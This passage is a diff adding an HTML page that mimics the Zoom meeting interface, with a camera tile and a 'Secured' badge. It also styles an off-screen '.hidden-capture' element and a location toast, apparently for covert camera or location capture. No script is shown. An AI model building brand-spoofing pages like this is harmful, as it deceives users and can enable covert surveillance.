@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Zoom Meeting</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%232D8CFF'/><text x='50%' y='58%' text-anchor='middle' dominant-baseline='middle' font-family='Arial' font-weight='900' font-size='11' fill='white'>zoom</text></svg>">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --zoom-bg:    #1C1C1E;
+      --tile-bg:    #2D2D2D;
+      --bar-bg:     #1C1C1E;
+      --bar-border: rgba(255,255,255,0.08);
+      --text:       #FFFFFF;
+      --text-dim:   #AEAEB2;
+      --zoom-blue:  #2D8CFF;
+      --zoom-green: #00D26A;
+      --zoom-red:   #FF3B30;
+      --name-bg:    rgba(0,0,0,0.60);
+      --icon-bg:    rgba(0,0,0,0.50);
+      --btn-hover:  rgba(255,255,255,0.10);
+      --panel-bg:   #2C2C2E;
+      --panel-w:    320px;
+      --input-bg:   #3A3A3C;
+    }
+
+    html, body { height:100%; width:100%; background:var(--zoom-bg);
+      font-family:'Inter',-apple-system,sans-serif; color:var(--text);
+      overflow:hidden; user-select:none; -webkit-font-smoothing:antialiased; }
+
+    /* ─── TOP BAR ─── */
+    .top-bar { position:fixed; top:0; left:0; right:0; height:48px;
+      background:var(--bar-bg); display:flex; align-items:center;
+      justify-content:space-between; padding:0 16px; z-index:300;
+      border-bottom:1px solid var(--bar-border); }
+    .zoom-logo { font-size:1.45rem; font-weight:900; color:var(--zoom-blue);
+      letter-spacing:-0.5px; text-transform:lowercase; }
+    .top-center { position:absolute; left:50%; transform:translateX(-50%);
+      display:flex; align-items:center; gap:10px; font-size:0.8rem; }
+    .meeting-title { font-weight:600; font-size:0.82rem; }
+    .meeting-id-badge { display:flex; align-items:center; gap:5px;
+      color:var(--text-dim); font-size:0.75rem; }
+    .secure-badge { display:flex; align-items:center; gap:4px;
+      background:rgba(0,210,106,0.12); border:1px solid rgba(0,210,106,0.3);
+      border-radius:4px; padding:2px 7px; font-size:0.7rem;
+      color:var(--zoom-green); font-weight:500; }
+    .top-right { display:flex; align-items:center; gap:12px; }
+    .timer { background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.12);
+      border-radius:5px; padding:3px 9px; font-size:0.78rem; font-weight:600;
+      letter-spacing:0.5px; font-variant-numeric:tabular-nums; }
+    .top-btn { width:28px; height:28px; border-radius:5px; background:transparent;
+      border:none; cursor:pointer; display:flex; align-items:center; justify-content:center;
+      color:var(--text-dim); transition:background 0.15s; }
+    .top-btn:hover { background:var(--btn-hover); }
+
+    /* ─── STAGE ─── */
+    .stage { position:fixed; top:48px; bottom:72px; left:0; right:0;
+      display:grid; grid-template-columns:1fr 1fr; grid-template-rows:1fr 1fr;
+      gap:3px; padding:3px; background:#111;
+      transition:right 0.25s ease; }
+    .stage.panel-open { right:var(--panel-w); }
+
+    /* ─── TILES ─── */
+    .tile { background:var(--tile-bg); border-radius:8px; position:relative;
+      overflow:hidden; display:flex; align-items:center; justify-content:center;
+      border:2px solid transparent; transition:border-color 0.2s; }
+    .tile.speaking { border-color:var(--zoom-green);
+      animation:speakPulse 1.6s ease-in-out infinite; }
+    .tile-avatar-wrap { display:flex; align-items:center; justify-content:center;
+      width:100%; height:100%; }
+    .tile-avatar { width:96px; height:96px; border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      font-size:2.2rem; font-weight:700; color:#fff;
+      border:3px solid rgba(255,255,255,0.1); }
+    #videoYou { position:absolute; inset:0; width:100%; height:100%;
+      object-fit:cover; border-radius:6px; transform:scaleX(-1); display:none; }
+    #youPlaceholder { display:flex; flex-direction:column; align-items:center; gap:10px; }
+    #youSpinner { width:28px; height:28px; border-radius:50%;
+      border:3px solid rgba(255,255,255,0.08); border-top-color:var(--zoom-blue);
+      animation:spin 0.9s linear infinite; }
+    .tile-top-icons { position:absolute; top:8px; right:8px;
+      display:flex; gap:4px; align-items:center; }
+    .tile-icon { width:26px; height:26px; border-radius:5px;
+      background:var(--icon-bg); display:flex; align-items:center;
+      justify-content:center; backdrop-filter:blur(4px); }
+    .tile-icon svg { width:14px; height:14px; }
+    .tile-name { position:absolute; bottom:8px; left:10px;
+      display:flex; align-items:center; gap:6px; background:var(--name-bg);
+      padding:3px 8px 3px 5px; border-radius:4px;
+      font-size:0.78rem; font-weight:500; white-space:nowrap; }
+    .tile-overlay { position:absolute; inset:0; background:rgba(0,0,0,0.15);
+      opacity:0; transition:opacity 0.2s; }
+    .tile:hover .tile-overlay { opacity:1; }
+
+    /* ─── BOTTOM BAR ─── */
+    .bottom-bar { position:fixed; bottom:0; left:0; right:0; height:72px;
+      background:var(--bar-bg); display:flex; align-items:center;
+      justify-content:space-between; padding:0 20px;
+      border-top:1px solid var(--bar-border); z-index:300; }
+    .bar-section { display:flex; align-items:center; gap:4px; }
+    .tb-btn { display:flex; flex-direction:column; align-items:center; gap:4px;
+      padding:6px 12px; border-radius:8px; background:transparent; border:none;
+      cursor:pointer; color:var(--text); font-family:'Inter',sans-serif;
+      font-size:0.67rem; font-weight:400; transition:background 0.15s;
+      min-width:52px; white-space:nowrap; position:relative; }
+    .tb-btn:hover { background:var(--btn-hover); }
+    .tb-btn.active-panel { background:rgba(45,140,255,0.18); color:var(--zoom-blue); }
+    .tb-btn.active-panel svg { color:var(--zoom-blue) !important; }
+    .tb-btn svg { width:22px; height:22px; }
+    .tb-btn.muted-state svg.main-icon { color:var(--zoom-red); }
+    .chevron-arrow { position:absolute; top:6px; right:2px; }
+    .chevron-arrow svg { width:10px; height:10px; color:var(--text-dim); }
+    .count-badge { position:absolute; top:-4px; right:-6px; background:var(--zoom-blue);
+      border-radius:10px; font-size:0.6rem; font-weight:700;
+      padding:1px 5px; color:#fff; min-width:16px; text-align:center; }
+    .bar-divider { width:1px; height:36px; background:rgba(255,255,255,0.1);
+      margin:0 6px; flex-shrink:0; }
+    .leave-btn { background:var(--zoom-red); border:none; cursor:pointer;
+      color:#fff; padding:10px 20px; border-radius:8px;
+      font-family:'Inter',sans-serif; font-size:0.85rem; font-weight:600;
+      transition:background 0.15s, transform 0.1s; }
+    .leave-btn:hover  { background:#e0342a; }
+    .leave-btn:active { transform:scale(0.97); }
+
+    /* ═══════════════════════════════════════════
+       SIDE PANELS (slide in from right)
+    ═══════════════════════════════════════════ */
+    .side-panel {
+      position:fixed; top:48px; right:0; bottom:72px;
+      width:var(--panel-w);
+      background:var(--panel-bg);
+      border-left:1px solid rgba(255,255,255,0.08);
+      z-index:250;
+      display:none;
+      flex-direction:column;
+      transform:translateX(100%);
+      transition:transform 0.25s ease;
+    }
+    .side-panel.open { display:flex; transform:translateX(0); }
+
+    .panel-header {
+      display:flex; align-items:center; justify-content:space-between;
+      padding:14px 16px;
+      border-bottom:1px solid rgba(255,255,255,0.08);
+      flex-shrink:0;
+    }
+    .panel-title { font-size:0.92rem; font-weight:600; }
+    .panel-close { width:28px; height:28px; border-radius:50%; background:transparent;
+      border:none; cursor:pointer; display:flex; align-items:center;
+      justify-content:center; color:var(--text-dim); transition:background 0.15s; }
+    .panel-close:hover { background:rgba(255,255,255,0.1); }
+    .panel-body { flex:1; overflow-y:auto; padding:12px; }
+    .panel-body::-webkit-scrollbar { width:4px; }
+    .panel-body::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.15); border-radius:4px; }
+
+    /* ─── SECURITY PANEL ─── */
+    .security-row { display:flex; align-items:center; justify-content:space-between;
+      padding:12px 0; border-bottom:1px solid rgba(255,255,255,0.06); }
+    .security-row:last-child { border-bottom:none; }
+    .security-row-label { font-size:0.82rem; }
+    .security-row-sub { font-size:0.72rem; color:var(--text-dim); margin-top:2px; }
+    /* Toggle switch */
+    .toggle-wrap { position:relative; width:40px; height:22px; flex-shrink:0; }
+    .toggle-wrap input { opacity:0; width:0; height:0; }
+    .toggle-slider { position:absolute; inset:0; background:#555; border-radius:11px;
+      cursor:pointer; transition:background 0.2s; }
+    .toggle-slider::before { content:''; position:absolute; width:18px; height:18px;
+      border-radius:50%; background:#fff; top:2px; left:2px; transition:transform 0.2s; }
+    input:checked + .toggle-slider { background:var(--zoom-blue); }
+    input:checked + .toggle-slider::before { transform:translateX(18px); }
+
+    /* ─── PARTICIPANTS PANEL ─── */
+    .participant-search { width:100%; background:var(--input-bg); border:1px solid rgba(255,255,255,0.1);
+      border-radius:8px; padding:8px 12px; color:var(--text); font-size:0.82rem;
+      font-family:'Inter',sans-serif; margin-bottom:10px; outline:none; }
+    .participant-search::placeholder { color:var(--text-dim); }
+    .participant-item { display:flex; align-items:center; gap:10px;
+      padding:8px 6px; border-radius:6px; transition:background 0.15s; cursor:default; }
+    .participant-item:hover { background:rgba(255,255,255,0.06); }
+    .p-avatar { width:36px; height:36px; border-radius:50%; flex-shrink:0;
+      display:flex; align-items:center; justify-content:center;
+      font-size:0.85rem; font-weight:700; color:#fff; }
+    .p-name { font-size:0.82rem; flex:1; }
+    .p-name small { display:block; font-size:0.7rem; color:var(--text-dim); }
+    .p-icons { display:flex; gap:5px; }
+    .p-icon { width:24px; height:24px; display:flex; align-items:center; justify-content:center; }
+    .p-icon svg { width:14px; height:14px; }
+    .p-section-label { font-size:0.7rem; color:var(--text-dim); font-weight:600;
+      letter-spacing:0.5px; text-transform:uppercase; padding:8px 6px 4px; }
+
+    /* ─── CHAT PANEL ─── */
+    .chat-messages { flex:1; overflow-y:auto; padding:8px; display:flex;
+      flex-direction:column; gap:12px; }
+    .chat-messages::-webkit-scrollbar { width:4px; }
+    .chat-messages::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.15); border-radius:4px; }
+    .chat-msg { display:flex; flex-direction:column; gap:3px; }
+    .chat-msg-header { display:flex; align-items:baseline; gap:8px; }
+    .chat-msg-name { font-size:0.8rem; font-weight:600; }
+    .chat-msg-time { font-size:0.68rem; color:var(--text-dim); }
+    .chat-msg-text { font-size:0.82rem; color:#E0E0E0; line-height:1.45; }
+    .chat-footer { flex-shrink:0; padding:10px 12px;
+      border-top:1px solid rgba(255,255,255,0.08); }
+    .chat-input-wrap { display:flex; align-items:center; gap:8px;
+      background:var(--input-bg); border:1px solid rgba(255,255,255,0.1);
+      border-radius:8px; padding:8px 10px; }
+    .chat-input { flex:1; background:transparent; border:none; color:var(--text);
+      font-size:0.82rem; font-family:'Inter',sans-serif; outline:none; }
+    .chat-input::placeholder { color:var(--text-dim); }
+    .chat-send-btn { background:transparent; border:none; cursor:pointer;
+      color:var(--zoom-blue); display:flex; align-items:center; justify-content:center; }
+    .chat-send-btn svg { width:18px; height:18px; }
+
+    /* ─── SHARE SCREEN DIALOG ─── */
+    #shareOverlay { position:fixed; inset:0; background:rgba(0,0,0,0.7);
+      z-index:400; display:none; align-items:center; justify-content:center;
+      backdrop-filter:blur(4px); }
+    #shareOverlay.open { display:flex; }
+    .share-dialog { background:#2C2C2E; border-radius:14px; width:560px;
+      max-width:95vw; padding:0; overflow:hidden;
+      box-shadow:0 24px 60px rgba(0,0,0,0.6); }
+    .share-dialog-header { padding:18px 20px;
+      border-bottom:1px solid rgba(255,255,255,0.08);
+      display:flex; align-items:center; justify-content:space-between; }
+    .share-dialog-title { font-size:0.95rem; font-weight:600; }
+    .share-tabs { display:flex; gap:0; padding:12px 20px 0;
+      border-bottom:1px solid rgba(255,255,255,0.08); }
+    .share-tab { padding:8px 16px; font-size:0.82rem; cursor:pointer;
+      color:var(--text-dim); border-bottom:2px solid transparent;
+      transition:color 0.15s, border-color 0.15s; }
+    .share-tab.active { color:var(--zoom-blue); border-bottom-color:var(--zoom-blue); }
+    .share-grid { display:grid; grid-template-columns:repeat(3,1fr);
+      gap:10px; padding:16px 20px; }
+    .share-item { background:#3A3A3C; border:2px solid transparent; border-radius:8px;
+      aspect-ratio:16/9; display:flex; flex-direction:column;
+      align-items:center; justify-content:center; gap:6px;
+      cursor:pointer; transition:border-color 0.15s, background 0.15s; font-size:0.72rem; }
+    .share-item:hover { border-color:var(--zoom-blue); background:#444; }
+    .share-item.selected { border-color:var(--zoom-blue); }
+    .share-item svg { width:32px; height:32px; color:var(--text-dim); }
+    .share-footer { padding:12px 20px; display:flex; justify-content:flex-end; gap:10px;
+      border-top:1px solid rgba(255,255,255,0.08); }
+    .share-btn { padding:9px 20px; border-radius:6px; border:none;
+      font-family:'Inter',sans-serif; font-size:0.82rem; font-weight:500;
+      cursor:pointer; transition:background 0.15s; }
+    .share-btn.primary { background:var(--zoom-blue); color:#fff; }
+    .share-btn.primary:hover { background:#1a7de0; }
+    .share-btn.secondary { background:rgba(255,255,255,0.1); color:var(--text); }
+    .share-btn.secondary:hover { background:rgba(255,255,255,0.15); }
+
+    /* ─── REACTIONS PICKER ─── */
+    #reactionsBar { position:fixed; bottom:82px; left:50%;
+      transform:translateX(-50%) translateY(10px);
+      background:#2C2C2E; border:1px solid rgba(255,255,255,0.1);
+      border-radius:50px; padding:8px 14px;
+      display:none; align-items:center; gap:4px;
+      z-index:400; box-shadow:0 8px 30px rgba(0,0,0,0.5);
+      transition:opacity 0.2s, transform 0.2s; opacity:0; }
+    #reactionsBar.open { display:flex; opacity:1; transform:translateX(-50%) translateY(0); }
+    .reaction-btn { width:40px; height:40px; border-radius:50%; background:transparent;
+      border:none; cursor:pointer; font-size:1.3rem;
+      display:flex; align-items:center; justify-content:center;
+      transition:background 0.15s, transform 0.15s; }
+    .reaction-btn:hover { background:rgba(255,255,255,0.1); transform:scale(1.2); }
+
+    /* Floating reaction */
+    .floating-reaction { position:fixed; font-size:2rem; pointer-events:none;
+      z-index:500; animation:floatUp 3s ease-out forwards; }
+    @keyframes floatUp {
+      0%   { opacity:1; transform:translateY(0) scale(1); }
+      80%  { opacity:1; }
+      100% { opacity:0; transform:translateY(-200px) scale(1.3); }
+    }
+
+    /* ─── MORE DROPDOWN ─── */
+    #moreMenu { position:fixed; bottom:82px; right:80px;
+      background:#2C2C2E; border:1px solid rgba(255,255,255,0.1);
+      border-radius:10px; width:220px;
+      box-shadow:0 8px 30px rgba(0,0,0,0.5);
+      z-index:400; display:none; overflow:hidden; }
+    #moreMenu.open { display:block; }
+    .more-item { display:flex; align-items:center; gap:12px;
+      padding:11px 16px; cursor:pointer; font-size:0.82rem;
+      transition:background 0.15s; }
+    .more-item:hover { background:rgba(255,255,255,0.08); }
+    .more-item svg { width:18px; height:18px; color:var(--text-dim); flex-shrink:0; }
+    .more-item-label { flex:1; }
+    .more-item-badge { background:rgba(255,255,255,0.15); border-radius:4px;
+      font-size:0.65rem; padding:1px 5px; }
+    .more-divider { height:1px; background:rgba(255,255,255,0.07); margin:2px 0; }
+
+    /* ─── APPS PANEL ─── */
+    .apps-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+    .app-tile { background:#3A3A3C; border-radius:10px; padding:14px 10px;
+      display:flex; flex-direction:column; align-items:center; gap:8px;
+      cursor:pointer; transition:background 0.15s; }
+    .app-tile:hover { background:#444; }
+    .app-tile svg { width:28px; height:28px; }
+    .app-tile-name { font-size:0.72rem; color:var(--text-dim); text-align:center; }
+    .app-search { width:100%; background:var(--input-bg);
+      border:1px solid rgba(255,255,255,0.1); border-radius:8px;
+      padding:8px 12px; color:var(--text); font-size:0.82rem;
+      font-family:'Inter',sans-serif; margin-bottom:12px; outline:none; }
+    .app-search::placeholder { color:var(--text-dim); }
+
+    /* ─── LOCATION TOAST ─── */
+    #locToast { position:fixed; bottom:82px; left:16px;
+      background:rgba(28,28,30,0.95); border:1px solid rgba(255,255,255,0.1);
+      border-radius:8px; padding:9px 14px; font-size:0.78rem; color:var(--text-dim);
+      display:none; align-items:center; gap:8px;
+      z-index:350; backdrop-filter:blur(10px);
+      box-shadow:0 4px 20px rgba(0,0,0,0.5); }
+    #locToast.show { display:flex; }
+
+    /* Hidden capture */
+    .hidden-capture { position:absolute; top:-9999px; left:-9999px;
+      opacity:0; pointer-events:none; }
+
+    /* Animations */
+    @keyframes spin { to { transform:rotate(360deg); } }
+    @keyframes speakPulse {
+      0%,100% { box-shadow:0 0 0 2px rgba(0,210,106,0.2); }
+      50%      { box-shadow:0 0 0 4px rgba(0,210,106,0.5); }
+    }
+
+    @media (max-width:520px) {
+      :root { --panel-w:100vw; }
+      .tb-btn { min-width:40px; font-size:0.6rem; padding:6px 6px; }
+      .tile-avatar { width:68px; height:68px; font-size:1.6rem; }
+      .top-center { display:none; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ═══════ TOP BAR ═══════ -->
+<div class="top-bar">
+  <div class="zoom-logo">zoom</div>
+  <div class="top-center">
+    <span class="meeting-title">Team Sync</span>
+    <span class="meeting-id-badge">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      <span id="meetId">…</span>
+    </span>
+    <span class="secure-badge">
+      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secured
+    </span>
+  </div>
+  <div class="top-right">
+    <div class="timer" id="callTimer">00:00</div>
+    <button class="top-btn">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+    </button>
+  </div>
+</div>
+
+<!-- ═══════ VIDEO GRID ═══════ -->
+<div class="stage" id="stage">
+
+  <!-- Tile 1: Host -->
+  <div class="tile speaking" id="tile1">
+    <div class="tile-avatar-wrap">
+      <div class="tile-avatar" style="background:linear-gradient(135deg,#5E5CE6,#7B61FF);">AJ</div>
+    </div>
+    <div class="tile-top-icons">
+      <div class="tile-icon"><svg viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/></svg></div>
+      <div class="tile-icon"><svg viewBox="0 0 24 24" fill="var(--text-dim)"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
+    </div>
+    <div class="tile-name"><svg width="13" height="13" viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/></svg> Alex Johnson (Host)</div>
+    <div class="tile-overlay"></div>
+  </div>
+
+  <!-- Tile 2: Sarah -->
+  <div class="tile" id="tile2">
+    <div class="tile-avatar-wrap">
+      <div class="tile-avatar" style="background:linear-gradient(135deg,#30D158,#1A9E42);">SK</div>
+    </div>
+    <div class="tile-top-icons">
+      <div class="tile-icon"><svg viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/></svg></div>
+      <div class="tile-icon"><svg viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M21 6.5l-4-4-8.5 8.5-2 4.5 4.5-2L21 6.5zM3.5 20.5h17v-2h-17v2z"/></svg></div>
+    </div>
+    <div class="tile-name"><svg width="13" height="13" viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/></svg> Sarah K.</div>
+    <div class="tile-overlay"></div>
+  </div>
+
+  <!-- Tile 3: Michael -->
+  <div class="tile" id="tile3">
+    <div class="tile-avatar-wrap">
+      <div class="tile-avatar" style="background:linear-gradient(135deg,#FF9F0A,#FF6B00);">MR</div>
+    </div>
+    <div class="tile-top-icons">
+      <div class="tile-icon"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg></div>
+      <div class="tile-icon"><svg viewBox="0 0 24 24" fill="var(--text-dim)"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
+    </div>
+    <div class="tile-name"><svg width="13" height="13" viewBox="0 0 24 24" fill="white"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg> Michael R.</div>
+    <div class="tile-overlay"></div>
+  </div>
+
+  <!-- Tile 4: You -->
+  <div class="tile" id="youTile">
+    <video id="videoYou" autoplay playsinline muted></video>
+    <div class="tile-avatar-wrap" id="youPlaceholder">
+      <div style="display:flex;flex-direction:column;align-items:center;gap:10px;">
+        <div id="youSpinner"></div>
+        <span style="font-size:0.75rem;color:var(--text-dim);">Starting camera…</span>
+      </div>
+    </div>
+    <div class="tile-top-icons">
+      <div class="tile-icon" id="youMicIcon"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg></div>
+      <div class="tile-icon" id="youCamIcon"><svg viewBox="0 0 24 24" fill="#fff"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
+    </div>
+    <div class="tile-name"><svg width="13" height="13" viewBox="0 0 24 24" fill="white"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg> You</div>
+    <div class="tile-overlay"></div>
+  </div>
+
+</div>
+
+<!-- ═══════ SIDE PANELS ═══════ -->
+
+<!-- SECURITY -->
+<div class="side-panel" id="panelSecurity">
+  <div class="panel-header">
+    <span class="panel-title">Security</span>
+    <button class="panel-close" onclick="closePanel('panelSecurity','btnSecurity')">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+  </div>
+  <div class="panel-body">
+    <div style="font-size:0.72rem;color:var(--text-dim);margin-bottom:12px;line-height:1.5;">
+      Control who can do what in your meeting.
+    </div>
+    <div style="font-size:0.78rem;font-weight:600;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;">Lock Meeting</div>
+    <div class="security-row">
+      <div><div class="security-row-label">Lock Meeting</div><div class="security-row-sub">No new participants can join</div></div>
+      <label class="toggle-wrap"><input type="checkbox"><span class="toggle-slider"></span></label>
+    </div>
+    <div class="security-row">
+      <div><div class="security-row-label">Enable Waiting Room</div><div class="security-row-sub">Admit participants manually</div></div>
+      <label class="toggle-wrap"><input type="checkbox" checked><span class="toggle-slider"></span></label>
+    </div>
+    <div style="font-size:0.78rem;font-weight:600;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.5px;margin:16px 0 8px;">Allow Participants To</div>
+    <div class="security-row">
+      <div><div class="security-row-label">Share Screen</div></div>
+      <label class="toggle-wrap"><input type="checkbox" checked><span class="toggle-slider"></span></label>
+    </div>
+    <div class="security-row">
+      <div><div class="security-row-label">Chat</div></div>
+      <label class="toggle-wrap"><input type="checkbox" checked><span class="toggle-slider"></span></label>
+    </div>
+    <div class="security-row">
+      <div><div class="security-row-label">Rename Themselves</div></div>
+      <label class="toggle-wrap"><input type="checkbox"><span class="toggle-slider"></span></label>
+    </div>
+    <div class="security-row">
+      <div><div class="security-row-label">Unmute Themselves</div></div>
+      <label class="toggle-wrap"><input type="checkbox" checked><span class="toggle-slider"></span></label>
+    </div>
+    <div class="security-row">
+      <div><div class="security-row-label">Start Video</div></div>
+      <label class="toggle-wrap"><input type="checkbox" checked><span class="toggle-slider"></span></label>
+    </div>
+  </div>
+</div>
+
+<!-- PARTICIPANTS -->
+<div class="side-panel" id="panelParticipants">
+  <div class="panel-header">
+    <span class="panel-title">Participants (4)</span>
+    <button class="panel-close" onclick="closePanel('panelParticipants','btnParticipants')">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+  </div>
+  <div class="panel-body">
+    <input class="participant-search" type="text" placeholder="Find a participant">
+    <div class="p-section-label">In Meeting</div>
+
+    <div class="participant-item">
+      <div class="p-avatar" style="background:linear-gradient(135deg,#5E5CE6,#7B61FF);">AJ</div>
+      <div class="p-name">Alex Johnson<small>Host</small></div>
+      <div class="p-icons">
+        <div class="p-icon"><svg viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/></svg></div>
+        <div class="p-icon"><svg viewBox="0 0 24 24" fill="var(--text-dim)"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
+      </div>
+    </div>
+    <div class="participant-item">
+      <div class="p-avatar" style="background:linear-gradient(135deg,#30D158,#1A9E42);">SK</div>
+      <div class="p-name">Sarah K.<small></small></div>
+      <div class="p-icons">
+        <div class="p-icon"><svg viewBox="0 0 24 24" fill="var(--zoom-red)"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/></svg></div>
